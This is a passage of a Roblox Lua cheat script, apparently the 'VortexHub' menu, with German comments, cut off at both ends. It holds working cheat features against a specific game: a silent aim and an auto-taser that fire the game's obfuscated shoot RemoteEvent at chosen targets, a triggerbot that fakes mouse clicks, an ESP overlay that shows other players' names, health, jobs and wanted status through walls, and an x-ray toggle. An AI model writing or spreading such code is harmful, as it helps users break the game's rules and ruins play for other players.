				fovCircle.Color = Color3.fromRGB(0, 255, 0)
	
				-- Schusslogik
				local tool = player.Character and player.Character:FindFirstChildWhichIsA("Tool")
				if tool then
					local direction = (target_position.Position - camera.CFrame.Position).Unit
					local args = {
						[1] = tool,
						[2] = player.Character.HumanoidRootPart.Position,
						[3] = direction
					}
					shootRemoteEvent:FireServer(unpack(args))
				end
			else
				fovCircle.Color = Color3.fromRGB(174, 255, 0)
			end
		else
			fovCircle.Color = Color3.fromRGB(255, 0, 0)
		end
	end)
	
	-- ðŸ–±ï¸ GUI-Toggle Buttons (falls vorhanden)
	if script.Parent:IsA("TextButton") then
		script.Parent.MouseButton1Up:Connect(function()
			aim_enabled = not aim_enabled
			fovCircle.Visible = aim_enabled
		end)
	end
	
	if script.Parent.Parent:FindFirstChild("2Toggle PartSilent") then
		script.Parent.Parent["2Toggle PartSilent"].MouseButton1Up:Connect(function()
			if TARGETPART == "Head" then
				TARGETPART = "HumanoidRootPart"
				script.Parent.Parent["2Toggle PartSilent"].Text = "Torso"
			else
				TARGETPART = "Head"
				script.Parent.Parent["2Toggle PartSilent"].Text = "Head"
			end
		end)
	end
end
task.spawn(SCRIPT_1f7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.animation \\ --
local function SCRIPT_1f8()
local script = UI["1f8"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1f8)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.TeaserAimScript \\ --
local function SCRIPT_1fe()
local script = UI["1fe"]
	local wantedRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["a3581179-8ba7-43e9-930f-ce588a96c919"]
	local shootRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["8b8ec986-2836-42ad-8e52-41d7fe03c958"]
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	
	local wantedPlayers = {}
	local autoTaserToggle = false
	local predictionFactor = 0.20
	local maxTargetDistance = 50
	
	local toggleButton = script.Parent
	if not toggleButton:IsA("TextButton") then
		warn("Error: Teaser B701484. PLEASE REPORT THIS IN VORTEXHUB DISCORD!")
		return
	end
	
	local function toggleAutoTaser()
		autoTaserToggle = not autoTaserToggle
		toggleButton.Text = autoTaserToggle and "AutoTaser: ON" or "AutoTaser: OFF"
		toggleButton.TextColor3 = autoTaserToggle and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 255)
	end
	
	toggleButton.MouseButton1Click:Connect(toggleAutoTaser)
	toggleButton.Text = "AutoTaser: OFF"
	toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	
	wantedRemoteEvent.OnClientEvent:Connect(function(eventData)
		if typeof(eventData) == "table" then
			wantedPlayers = table.clone(eventData)
		end
	end)
	
	local function getBestTarget()
		local myChar = LocalPlayer.Character
		if not (myChar and myChar:FindFirstChild("HumanoidRootPart")) then return end
	
		local bestTarget = nil
		local closestDistance = maxTargetDistance
	
		for _, player in ipairs(Players:GetPlayers()) do
			if wantedPlayers[player.Name] and player ~= LocalPlayer then
				local char = player.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					local humanoid = char:FindFirstChildOfClass("Humanoid")
					if humanoid and humanoid.Health > 0 then
						local distance = (myChar.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
						if distance < closestDistance then
							closestDistance = distance
							bestTarget = {
								player = player,
								part = char.HumanoidRootPart,
								distance = distance
							}
						end
					end
				end
			end
		end
	
		return bestTarget
	end
	
	RunService.Heartbeat:Connect(function()
		if not autoTaserToggle then return end
	
		local myChar = LocalPlayer.Character
		if not (myChar and myChar:FindFirstChild("HumanoidRootPart")) then return end
	
		local taser = myChar:FindFirstChild("Taser")
		if not taser then return end
	
		local target = getBestTarget()
		if not target then return end
	
		local shootFrom = myChar.HumanoidRootPart.Position
		local predictedPos = target.part.Position + (target.part.Velocity * predictionFactor)
		shootRemoteEvent:FireServer(taser, shootFrom, (predictedPos - shootFrom).Unit)
	end)
end
task.spawn(SCRIPT_1fe)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.animation \\ --
local function SCRIPT_1ff()
local script = UI["1ff"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1ff)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.LocalScript \\ --
local function SCRIPT_205()
local script = UI["205"]
	local VirtualInputManager = game:GetService("VirtualInputManager")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	
	local localPlayer = Players.LocalPlayer
	local mouse = localPlayer:GetMouse()
	
	local enabled = false
	local targetBodyParts = {"Head", "UpperTorso", "HumanoidRootPart", "LowerTorso"}
	local connection = nil
	
	-- Der Button ist das Parent dieses Scripts
	local triggerButton = script.Parent.Parent.TriggerBot
	if not triggerButton or not triggerButton:IsA("TextButton") then
		warn("TriggerBot Script muss in einem TextButton platziert werden!")
		return
	end
	
	-- Funktion zum Simulieren des Mausklicks
	local function click()
		VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1)
		task.wait(0.05)
		VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1)
	end
	
	-- ÃœberprÃ¼ft, ob das Ziel ein Spieler ist
	local function isValidTarget(part)
		local character = part:FindFirstAncestorOfClass("Model")
		if not character then return false end
	
		local player = Players:GetPlayerFromCharacter(character)
		if not player or player == localPlayer then return false end
	
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid or humanoid.Health <= 0.25 then return false end
	
		return true
	end
	
	-- Haupt-Triggerbot-Logik
	local function triggerbot()
		if not enabled then return end
	
		local target = mouse.Target
		if not target then return end
	
		if table.find(targetBodyParts, target.Name) and isValidTarget(target) then
			click()
		end
	end
	
	-- Funktion zum Aktivieren/Deaktivieren des Triggerbots
	local function toggleTriggerBot()
		enabled = not enabled
	
		if enabled then
			-- Verbindung herstellen, wenn aktiviert
			if not connection then
				connection = RunService.RenderStepped:Connect(triggerbot)
			end
			triggerButton.Text = "TriggerBot: ON"
			-- Visuelles Feedback fÃ¼r aktivierten Zustand
			if triggerButton:FindFirstChild("UICorner") then
				triggerButton.UICorner.CornerRadius = UDim.new(0, 8)
			end
			if triggerButton:FindFirstChild("UIGradient") then
				triggerButton.UIGradient.Enabled = true
			end
		else
			-- Verbindung trennen, wenn deaktiviert
			if connection then
				connection:Disconnect()
				connection = nil
			end
			triggerButton.Text = "TriggerBot: OFF"
			-- Visuelles Feedback fÃ¼r deaktivierten Zustand
			if triggerButton:FindFirstChild("UICorner") then
				triggerButton.UICorner.CornerRadius = UDim.new(0, 4)
			end
			if triggerButton:FindFirstChild("UIGradient") then
				triggerButton.UIGradient.Enabled = false
			end
		end
	end
	
	-- Button Click Event
	triggerButton.MouseButton1Click:Connect(toggleTriggerBot)
	
	-- Initialen Zustand setzen
	triggerButton.Text = "TriggerBot: OFF"
end
task.spawn(SCRIPT_205)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.animation \\ --
local function SCRIPT_206()
local script = UI["206"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_206)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ESP-Controller \\ --
local function SCRIPT_20a()
local script = UI["20a"]
	-- Lokale Variablen fÃ¼r Layout
	local nameLabelHeight = 11
	local displayNameLabelHeight = 11.5
	local distanceLabelHeight = 11.5
	local jobLabelHeight = 11.5
	local wantedLabelHeight = 10
	local healthBarWidth = 60
	local healthBarHeight = 6
	local elementSpacing = 2
	local maxDistance = 1000 -- Maximale Distanz in Studs, nach der das ESP ausgeblendet wird
	local wantedRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["a3581179-8ba7-43e9-930f-ce588a96c919"]
	
	-- Tabelle, um die aktuellen ESPs zu verfolgen
	local espTable = {}
	local wantedPlayers = {}
	
	-- Farbzuweisung fÃ¼r Jobs
	local jobColors = {
		Police = Color3.fromRGB(0, 0, 255), -- Bright blue
		ADAC = Color3.fromRGB(255, 165, 0), -- Deep orange
		BusCompany = Color3.fromRGB(97, 64, 81), -- Eggplant
		Citizen = Color3.fromRGB(169, 169, 169), -- Ghost grey
		FireDepartment = Color3.fromRGB(255, 0, 0), -- Bright red
		Prisoner = Color3.fromRGB(0, 0, 0), -- Black
		TruckCompany = Color3.fromRGB(0, 100, 0) -- Dark green
	}
	
	-- Sichtbarkeitsstatus der ESP-Elemente
	local espVisibility = {
		DisplayName = false,
		Name = false,
		HealthBar = false,
		Distance = false,
		Job = false,
		Wanted = false
	}
	
	-- Cache der Spielservices
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	
	-- Hilfsfunktion zum Erstellen von TextLabels
	local function createTextLabel(parent, name, size, position, textColor, font, textSize)
		local label = Instance.new("TextLabel")
		label.Name = name
		label.Parent = parent
		label.Size = size
		label.Position = position
		label.BackgroundTransparency = 1
		label.TextColor3 = textColor
		label.Font = font
		label.TextSize = textSize
		label.TextStrokeTransparency = 0
		label.Text = ""
		return label
	end
	
	-- Funktion zum Aktualisieren des ESP fÃ¼r alle Spieler
	local function updateESPForPlayers()
		for _, player in pairs(Players:GetPlayers()) do
			if player == LocalPlayer then
				-- Ãœberspringe den eigenen Spieler
				continue
			end
	
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local jobName = player.Team and player.Team.Name
				if jobName and jobColors[jobName] then
					if not espTable[player] then
						createESP(player, jobName)
					end
				else
					removeESP(player)
				end
			end
		end
	end
	
	-- Funktion zum Umschalten der ESP-Sichtbarkeit
	local function toggleESP(labelKey, button)
		espVisibility[labelKey] = not espVisibility[labelKey]
		if espVisibility[labelKey] then
			button.Text = button.Text:gsub("OFF", "ON")
		else
			button.Text = button.Text:gsub("ON", "OFF")
		end
		updateESPForPlayers()
	end
	
	-- Funktion zum Erstellen des ESP fÃ¼r einen Spieler
	local function createESP(player, jobName)
		if player == LocalPlayer then
			-- Ãœberspringe den eigenen Spieler
			return
		end
	
		if espTable[player] then return end -- Verhindert das erneute Erstellen, wenn bereits ein ESP vorhanden ist
	
		local character = player.Character
		if not character then return end
	
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then return end
	
		-- BillboardGui erstellen
		local billboard = Instance.new("BillboardGui")
		billboard.Adornee = humanoidRootPart
		billboard.Size = UDim2.new(0, 200, 0, displayNameLabelHeight + nameLabelHeight + distanceLabelHeight + jobLabelHeight + healthBarHeight + (elementSpacing * 5))
		billboard.StudsOffset = Vector3.new(0, 3, 0)
		billboard.AlwaysOnTop = true
	
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(1, 0, 1, 0)
		frame.BackgroundTransparency = 1
		frame.Parent = billboard
	
		-- TextLabels erstellen
		local displayNameLabel = createTextLabel(
			frame,
			"DisplayNameLabel",
			UDim2.new(1, 0, 0, displayNameLabelHeight),
			UDim2.new(0, 0, 0, 0),
			Color3.fromRGB(255, 255, 255),
			Enum.Font.SourceSansBold,
			16
		)
	
		local nameLabel = createTextLabel(
			frame,
			"NameLabel",
			UDim2.new(1, 0, 0, nameLabelHeight),
			UDim2.new(0, 0, 0, displayNameLabelHeight + elementSpacing),
			Color3.fromRGB(255, 255, 255),
			Enum.Font.SourceSansBold,
			16
		)
	
		local distanceLabel = createTextLabel(
			frame,
			"DistanceLabel",
			UDim2.new(1, 0, 0, distanceLabelHeight),
			UDim2.new(0, 0, 0, displayNameLabelHeight + nameLabelHeight + elementSpacing * 2),
			Color3.fromRGB(255, 255, 255),
			Enum.Font.SourceSansBold,
			16
		)
	
		local jobLabel = createTextLabel(
			frame,
			"JobLabel",
			UDim2.new(1, 0, 0, jobLabelHeight),
			UDim2.new(0, 0, 0, displayNameLabelHeight + nameLabelHeight + distanceLabelHeight + elementSpacing * 3),
			Color3.fromRGB(255, 255, 0), -- Fallback auf weiÃŸ, wenn der Job nicht in der Tabelle ist
			Enum.Font.SourceSansBold,
			16
		)
	
		local wantedLabel = createTextLabel(
			frame,
			"WantedLabel",
			UDim2.new(1, 0, 0, jobLabelHeight),
			UDim2.new(0, 0, 0, displayNameLabelHeight + nameLabelHeight + distanceLabelHeight + wantedLabelHeight + wantedLabelHeight + elementSpacing * 3),
			jobColors[jobName] or Color3.fromRGB(255, 217, 0),
			Enum.Font.SourceSansBold,
			16
		)
	
		local healthBarFrame = Instance.new("Frame")
		healthBarFrame.Name = "HealthBarFrame"
		healthBarFrame.Size = UDim2.new(0, healthBarWidth, 0, healthBarHeight)
		healthBarFrame.Position = UDim2.new(0.5, -healthBarWidth / 2, 0, displayNameLabelHeight + nameLabelHeight + distanceLabelHeight + jobLabelHeight + elementSpacing * 4)
		healthBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		healthBarFrame.BorderSizePixel = 0
		healthBarFrame.Parent = frame
	
		local healthBar = Instance.new("Frame")
		healthBar.Name = "HealthBar"
		healthBar.Size = UDim2.new(1, 0, 1, 0)
		healthBar.Position = UDim2.new(0, 0, 0, 0)
		healthBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		healthBar.Parent = healthBarFrame
	
		-- Update-Funktion
	local function updateESP()
		local humanoid = character:FindFirstChild("Humanoid")
		if humanoid then
			local health = humanoid.Health
			local maxHealth = humanoid.MaxHealth
			local healthPercent = math.clamp(health / maxHealth, 0, 1)
			local localPlayerRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			if localPlayerRootPart then
				local distance = (humanoidRootPart.Position - localPlayerRootPart.Position).Magnitude
	
				if distance <= maxDistance then
					-- Sichtbarkeit setzen
					displayNameLabel.Visible = espVisibility.DisplayName
					nameLabel.Visible = espVisibility.Name
					distanceLabel.Visible = espVisibility.Distance
					jobLabel.Visible = espVisibility.Job
					healthBarFrame.Visible = espVisibility.HealthBar
					wantedLabel.Visible = espVisibility.Wanted
	
					-- Inhalte setzen
					displayNameLabel.Text = player.DisplayName
					nameLabel.Text = "@" .. player.Name
					distanceLabel.Text = "Distanz: " .. math.floor(distance) .. " studs"
					jobLabel.Text = jobName
					jobLabel.TextColor3 = jobColors[jobName] or Color3.fromRGB(255, 255, 255)
	
					-- WANTED / Not Wanted + Farbe
					local isWanted = wantedPlayers[player.Name] ~= nil
					wantedLabel.Text = isWanted and "WANTED" or "Not Wanted"
					wantedLabel.TextColor3 = isWanted and Color3.fromRGB(255, 217, 0) or Color3.fromRGB(150, 150, 150)
	
					-- Blinkanimation fÃ¼r WANTED
					if isWanted then
						local time = tick() % 1
						local alpha = math.abs(math.sin(time * math.pi))
						wantedLabel.TextTransparency = alpha * 0.5
						wantedLabel.TextStrokeTransparency = alpha * 0.5
					else
						wantedLabel.TextTransparency = 0
						wantedLabel.TextStrokeTransparency = 0
					end
	
					-- Healthbar-Animation
					local TweenService = game:GetService("TweenService")
					local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
					TweenService:Create(healthBar, tweenInfo, { Size = UDim2.new(healthPercent, 0, 1, 0) }):Play()
	
					-- Dynamische Positionierung
					local currentY = 0
					if displayNameLabel.Visible then
						displayNameLabel.Position = UDim2.new(0, 0, 0, currentY)
						currentY = currentY + displayNameLabelHeight + elementSpacing
					end
					if nameLabel.Visible then
						nameLabel.Position = UDim2.new(0, 0, 0, currentY)
						currentY = currentY + nameLabelHeight + elementSpacing
					end
					if distanceLabel.Visible then
						distanceLabel.Position = UDim2.new(0, 0, 0, currentY)
						currentY = currentY + distanceLabelHeight + elementSpacing
					end
					if jobLabel.Visible then
						jobLabel.Position = UDim2.new(0, 0, 0, currentY)
						currentY = currentY + jobLabelHeight + elementSpacing
					end
					if wantedLabel.Visible then
						wantedLabel.Position = UDim2.new(0, 0, 0, currentY)
						currentY = currentY + wantedLabelHeight + elementSpacing
					end
					if healthBarFrame.Visible then
						healthBarFrame.Position = UDim2.new(0.5, -healthBarWidth / 2, 0, currentY)
					end
				else
					-- Wenn zu weit entfernt -> alles unsichtbar
					displayNameLabel.Visible = false
					nameLabel.Visible = false
					distanceLabel.Visible = false
					jobLabel.Visible = false
					healthBarFrame.Visible = false
					wantedLabel.Visible = false
				end
			end
		end
	end
	
	
	
		-- Update-Loop
		local connection
		connection = RunService.Heartbeat:Connect(function()
			updateESP()
			if not character.Parent then
				connection:Disconnect()
				espTable[player] = nil
			end
		end)
	
		-- BillboardGui an den Charakter anhÃ¤ngen
		billboard.Parent = character
		espTable[player] = billboard -- Speichern des BillboardGui in der Tabelle
	end
	
	
	-- Funktion zum Entfernen des ESP fÃ¼r einen Spieler
	local function removeESP(player)
		if espTable[player] then
			local billboard = espTable[player]
			billboard:Destroy()
			espTable[player] = nil
		end
	end
	
	-- Funktion zum Aktualisieren der ESPs fÃ¼r alle Spieler
	local function updateESPForPlayers()
		for _, player in pairs(Players:GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local jobName = player.Team and player.Team.Name
				if jobName and jobColors[jobName] then
					if not espTable[player] then
						createESP(player, jobName)
					end
				else
					removeESP(player)
				end
			end
		end
	end
	
	-- Funktion zum ÃœberprÃ¼fen von JobÃ¤nderungen
	local function checkPlayerJobChanges()
		for _, player in pairs(Players:GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local currentJob = player.Team and player.Team.Name
				local espBillboard = espTable[player]
				if espBillboard then
					local frame = espBillboard:FindFirstChildOfClass("Frame")
					if frame then
						local jobLabel = frame:FindFirstChild("JobLabel")
						if jobLabel then
							if jobLabel.Text ~= currentJob then
								jobLabel.Text = currentJob
								jobLabel.TextColor3 = jobColors[currentJob] or Color3.fromRGB(255, 255, 255)
							end
						end
					end
				end
			end
		end
	end
	
	-- Update Loop fÃ¼r ESPs und JobÃ¤nderungen
	local runService = game:GetService("RunService")
	local updateConnection
	updateConnection = runService.Heartbeat:Connect(function()
		updateESPForPlayers()
		checkPlayerJobChanges()
	end)
	
	-- Stelle sicher, dass der eigene Charakter auch ESP hat
	local function updateOwnESP()
		local player = LocalPlayer
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			createESP(player, "LocalPlayer")
		end
	end
	updateOwnESP()
	
	-- Aktualisiere, wenn ein Spieler beitritt oder das Team wechselt
	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(character)
			wait(1) -- Warte 1 Sekunde, damit der Charakter vollstÃ¤ndig geladen wird
			updateESPForPlayers()
		end)
	end)
	
	Players.PlayerRemoving:Connect(function(player)
		removeESP(player)
	end)
	
	local function updateWanted(eventData)
		for playerName, _ in pairs(wantedPlayers) do
			if not eventData[playerName] then
				wantedPlayers[playerName] = nil
			end
		end
	
		for i, v in pairs(game.Players:GetPlayers()) do
			if eventData[v.Name] and not wantedPlayers[v.Name] then
				wantedPlayers[v.Name] = true
			end
		end
	end
	
	wantedRemoteEvent.OnClientEvent:Connect(function(eventData)
		if typeof(eventData) == "table" then
			updateWanted(eventData)
		end
	end)
	
	-- GUI-Elemente fÃ¼r die ESP-Steuerung
	
	local visuals = script.Parent.ScrollingFrame
	if visuals then
		local buttons = {
			DisplayName = visuals:WaitForChild("NameToggleButton"),
			Name = visuals:WaitForChild("UserToggleButton"),
			HealthBar = visuals:WaitForChild("HealthBarToggleButton"),
			Distance = visuals:WaitForChild("DistanceToggleButton"),
			Job = visuals:WaitForChild("JobToggleButton"),
			Wanted = visuals:WaitForChild("WantedToggleButton")
		}
	
		for key, button in pairs(buttons) do
			button.MouseButton1Click:Connect(function()
				toggleESP(key, button)
			end)
		end
	else
		warn("Visuals GUI nicht gefunden. Stelle sicher, dass das Skript korrekt platziert ist.")
	end
end
task.spawn(SCRIPT_20a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Blurred.LocalScript \\ --
local function SCRIPT_22a()
local script = UI["22a"]
	-- Referenzen
	local Lighting = game:GetService("Lighting")
	local button = script.Parent
	
	-- TiefenschÃ¤rfe-Effekt erstellen
	local depthOfField = Instance.new("DepthOfFieldEffect")
	depthOfField.InFocusRadius = 100 -- Bereich, der fokussiert bleibt (je hÃ¶her, desto mehr bleibt scharf)
	depthOfField.FarIntensity = 0.5 -- IntensitÃ¤t der UnschÃ¤rfe in der Ferne
	depthOfField.NearIntensity = 0 -- IntensitÃ¤t der UnschÃ¤rfe in der NÃ¤he
	depthOfField.Parent = Lighting
	
	-- Status fÃ¼r Effekt
	local isBlurActive = false
	
	-- Funktion zum Ein- und Ausschalten der UnschÃ¤rfe
	local function toggleBlurEffect()
		isBlurActive = not isBlurActive
		depthOfField.Enabled = isBlurActive
		button.Text = isBlurActive and "Blurred: ON" or "Blurred: OFF"
	end
	
	-- Event-Listener fÃ¼r den Button
	button.MouseButton1Click:Connect(toggleBlurEffect)
	
	-- Start: UnschÃ¤rfe ausgeschaltet
	depthOfField.Enabled = false
	button.Text = "Blurred: OFF"
	
end
task.spawn(SCRIPT_22a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.LowGrafik.LocalScript \\ --
local function SCRIPT_22f()
local script = UI["22f"]
	local fpsBoosterEnabled = false  -- Status des FPS-Boosters, standardmÃ¤ÃŸig deaktiviert
	local button = script.Parent  -- Verweis auf den Button
	
	-- Funktion, die den FPS-Booster aktiviert
	local function enableFPSBooster()
		print("FPS Booster wird aktiviert...")  -- Debug-Nachricht
	
		-- ÃœberprÃ¼fen, ob `_G` existiert, und Standardwerte setzen
		_G.Ignore = _G.Ignore or {}
		_G.WaitPerAmount = _G.WaitPerAmount or 500
		_G.SendNotifications = _G.SendNotifications or false
		_G.ConsoleLogs = _G.ConsoleLogs or false
		_G.Settings = _G.Settings or {
			Players = { ["Ignore Me"] = true, ["Ignore Others"] = true, ["Ignore Tools"] = true },
			Meshes = { NoMesh = false, NoTexture = false, Destroy = false },
			Images = { Invisible = false, Destroy = false },
			Explosions = { Smaller = true, Invisible = false, Destroy = false },
			Particles = { Invisible = true, Destroy = false },
			TextLabels = { LowerQuality = false, Invisible = false, Destroy = false },
			MeshParts = { LowerQuality = false, Invisible = false, NoTexture = true, NoMesh = false, Destroy = false },
			Other = {
				["FPS Cap"] = 240,
				["No Camera Effects"] = true,
				["No Clothes"] = true,
				["Low Water Graphics"] = true,
				["No Shadows"] = true,
				["Low Rendering"] = false,
				["Low Quality Parts"] = true,
				["Low Quality Models"] = true,
				["Reset Materials"] = true,
				["Lower Quality MeshParts"] = true
			}
		}
	
		-- FPS-Booster-Logik hinzufÃ¼gen
		local Players, Lighting, StarterGui, MaterialService = game:GetService("Players"), game:GetService("Lighting"), game:GetService("StarterGui"), game:GetService("MaterialService")
		local ME, CanBeEnabled = Players.LocalPlayer, {"ParticleEmitter", "Trail", "Smoke", "Fire", "Sparkles"}
	
		-- Logik zum Deaktivieren visueller Effekte und Reduzieren der Grafiken
		local function processInstance(Instance)
			if not Instance:IsDescendantOf(Players) then
				if Instance:IsA("DataModelMesh") then
					if _G.Settings.Meshes.NoMesh and Instance:IsA("SpecialMesh") then Instance.MeshId = "" end
					if _G.Settings.Meshes.NoTexture and Instance:IsA("SpecialMesh") then Instance.TextureId = "" end
					if _G.Settings.Meshes.Destroy then Instance:Destroy() end
				elseif Instance:IsA("FaceInstance") then
					if _G.Settings.Images.Invisible then Instance.Transparency = 1; Instance.Shiny = 1 end
					if _G.Settings.Images.Destroy then Instance:Destroy() end
				end
				-- Weitere Typen hier hinzufÃ¼gen
			end
		end
	
		-- Alle Objekte im Spiel verarbeiten
		for _, instance in pairs(game:GetDescendants()) do
			processInstance(instance)
		end
		game.DescendantAdded:Connect(processInstance)
	
		StarterGui:SetCore("SendNotification", {
			Title = "VortexHub",
			Text = "FPS Booster aktiviert",
			Duration = 5,
			Button1 = "Okay"
		})
		fpsBoosterEnabled = true
	end
	
	-- Funktion, die den FPS-Booster deaktiviert
	local function disableFPSBooster()
		print("FPS Booster wird deaktiviert...")  -- Debug-Nachricht
		StarterGui:SetCore("SendNotification", {
			Title = "VortexHub",
			Text = "FPS Booster deaktiviert",
			Duration = 5,
			Button1 = "Okay"
		})
		fpsBoosterEnabled = false
	end
	
	-- Toggle-Funktion zum Ein- und Ausschalten des FPS-Boosters
	local function toggleFPSBooster()
		if fpsBoosterEnabled then
			disableFPSBooster()
			button.Text = "FPS Boost"  -- Button-Text auf "AUS" setzen
		else
			enableFPSBooster()
			button.Text = "FPS Boost"   -- Button-Text auf "AN" setzen
		end
	end
	
	-- Button-Ereignis verknÃ¼pfen
	button.MouseButton1Click:Connect(toggleFPSBooster)
	
	-- Anfangsstatus des Buttons
	button.Text = "FPS Boost"
	
end
task.spawn(SCRIPT_22f)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Xray.LocalScript \\ --
local function SCRIPT_234()
local script = UI["234"]
	-- Toggle-Variable, um den Zustand des XRay-Effekts zu speichern
	local isXRayEnabled = false
	local button = script.Parent -- Verweis auf den Button
	
	-- Funktion, um den XRay-Effekt auf einem Teil festzulegen oder zu entfernen
	local function setXRayPart(part)
		if isXRayEnabled then
			part.LocalTransparencyModifier = 0.5 -- XRay an (durchscheinend)
		else
			part.LocalTransparencyModifier = 0 -- XRay aus (normal sichtbar)
		end
	end
	
	-- Funktion, um den XRay-Effekt rekursiv auf alle Teile anzuwenden
	local function recurseForParts(object)
		if object:IsA("BasePart") then
			setXRayPart(object)
		end
	
		-- Wenn das Objekt einen Humanoid hat, stoppen wir, um Spieler auszuschlieÃŸen
		if object:FindFirstChildOfClass("Humanoid") then return end
	
		-- Durchlaufe alle Kinder des Objekts und rufe die Funktion rekursiv auf
		for _, child in pairs(object:GetChildren()) do
			recurseForParts(child)
		end
	end
	
	-- Hauptfunktion zum Umschalten des XRay-Effekts
	local function toggleXRay()
		isXRayEnabled = not isXRayEnabled -- Zustand umschalten
	
		-- Den XRay-Effekt auf das gesamte Workspace anwenden oder entfernen
		recurseForParts(workspace)
	
		-- Den Text des Buttons anpassen, je nachdem ob XRay aktiv ist oder nicht
		if isXRayEnabled then
